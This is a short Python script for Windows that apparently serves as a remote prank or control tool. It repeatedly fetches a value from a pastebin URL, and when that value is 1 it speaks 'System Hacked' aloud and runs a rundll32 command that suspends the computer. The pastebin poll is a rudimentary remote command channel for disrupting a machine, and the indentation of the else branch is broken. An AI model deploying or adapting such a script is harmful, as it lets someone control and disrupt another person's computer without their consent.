import win32com.client as client
import bs4 as bs
from urllib import request
import os

while True:
 sauce = request.urlopen('https://pastebin.com/raw/MuS8ZYiX')
 soup = bs.BeautifulSoup(sauce,"lxml")
 print(soup.text)
 command = int(soup.text)

 speak = client.Dispatch("SAPI.SpVoice")
 if command==1:
    speak.Speak("System Hacked")
    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
else:
     pass